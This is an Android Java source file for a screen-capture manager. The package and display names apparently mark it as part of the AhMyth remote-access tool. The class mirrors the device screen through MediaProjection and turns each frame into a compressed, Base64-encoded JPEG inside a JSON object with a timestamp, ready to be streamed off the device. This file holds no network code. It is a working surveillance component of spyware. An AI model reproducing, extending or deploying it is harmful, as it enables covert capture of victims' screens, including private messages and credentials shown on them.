package ahmyth.mine.king.ahmyth;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

/**
 * ScreenCaptureManager handles screen capture and streaming
 * Note: Requires MediaProjection permission from user
 */
public class ScreenCaptureManager {
    private static final String TAG = "ScreenCapture";
    
    private Context context;
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler handler;
    private boolean isCapturing = false;
    
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;
    private int quality = 50; // JPEG quality 0-100
    private float scale = 0.5f; // Scale factor for smaller images
    
    public ScreenCaptureManager(Context context) {
        this.context = context;
        this.handler = new Handler(Looper.getMainLooper());
        initDisplayMetrics();
    }
    
    private void initDisplayMetrics() {
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        if (windowManager != null) {
            Display display = windowManager.getDefaultDisplay();
            DisplayMetrics metrics = new DisplayMetrics();
            display.getMetrics(metrics);
            
            screenWidth = (int) (metrics.widthPixels * scale);
            screenHeight = (int) (metrics.heightPixels * scale);
            screenDensity = metrics.densityDpi;
            
            Log.d(TAG, "Screen metrics: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");
        }
    }
    
    /**
     * Check if screen capture is supported
     */
    public boolean isSupported() {
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP;
    }
    
    /**
     * Get MediaProjectionManager for requesting permission
     */
    public MediaProjectionManager getProjectionManager() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            projectionManager = (MediaProjectionManager) context.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        }
        return projectionManager;
    }
    
    /**
     * Start screen capture with the given projection
     */
    @SuppressLint("WrongConstant")
    public void startCapture(MediaProjection projection) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            Log.w(TAG, "Screen capture not supported on this Android version");
            return;
        }
        
        if (isCapturing) {
            Log.w(TAG, "Already capturing");
            return;
        }
        
        this.mediaProjection = projection;
        
        try {
            // Create ImageReader
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2);
            
            // Create VirtualDisplay
            virtualDisplay = mediaProjection.createVirtualDisplay(
                "AhMythScreen",
                screenWidth,
                screenHeight,
                screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null,
                handler
            );
            
            isCapturing = true;
            Log.d(TAG, "Screen capture started");
            
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen capture", e);
            stopCapture();
        }
    }
    
    /**
     * Capture a single screenshot
     */
    public JSONObject captureScreen() {
        JSONObject result = new JSONObject();
        
        try {
            if (!isCapturing || imageReader == null) {
                result.put("success", false);
                result.put("error", "Screen capture not active");
                return result;
            }
            
            Image image = imageReader.acquireLatestImage();
            if (image == null) {
                result.put("success", false);
                result.put("error", "No image available");
                return result;
            }
            
            // Convert to bitmap
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * screenWidth;
            
            Bitmap bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888
            );
            bitmap.copyPixelsFromBuffer(buffer);
            image.close();
            
            // Crop to actual screen size
            if (bitmap.getWidth() != screenWidth) {
                bitmap = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight);
            }
            
            // Convert to base64 JPEG
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            byte[] imageBytes = baos.toByteArray();
            String base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP);
            
            bitmap.recycle();
            
            result.put("success", true);
            result.put("image", base64Image);
            result.put("width", screenWidth);
            result.put("height", screenHeight);
            result.put("size", imageBytes.length);
            result.put("timestamp", System.currentTimeMillis());
            
            Log.d(TAG, "Screenshot captured: " + imageBytes.length + " bytes");
            
        } catch (Exception e) {
            Log.e(TAG, "Error capturing screen", e);
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ignored) {}
        }
        
        return result;
    }
    
    /**
     * Get screen info without capture
     */
    public JSONObject getScreenInfo() {
        JSONObject info = new JSONObject();
        try {
            WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            if (windowManager != null) {
                Display display = windowManager.getDefaultDisplay();
                DisplayMetrics metrics = new DisplayMetrics();
                display.getRealMetrics(metrics);
                
                info.put("width", metrics.widthPixels);
                info.put("height", metrics.heightPixels);
                info.put("density", metrics.density);
                info.put("densityDpi", metrics.densityDpi);
                info.put("scaledDensity", metrics.scaledDensity);
                info.put("refreshRate", display.getRefreshRate());
                info.put("rotation", display.getRotation());
                info.put("isCapturing", isCapturing);
                info.put("isSupported", isSupported());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting screen info", e);
        }
        return info;
    }
    
    /**
     * Set capture quality
     */
    public void setQuality(int quality) {
        this.quality = Math.max(10, Math.min(100, quality));
    }
    
    /**
     * Set scale factor
     */
    public void setScale(float scale) {
        this.scale = Math.max(0.1f, Math.min(1.0f, scale));
        initDisplayMetrics();
    }
    
    /**
     * Stop screen capture
     */
    public void stopCapture() {
        isCapturing = false;
        
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        
        Log.d(TAG, "Screen capture stopped");
    }
    
    /**
     * Check if currently capturing
     */
    public boolean isCapturing() {
        return isCapturing;
    }
}

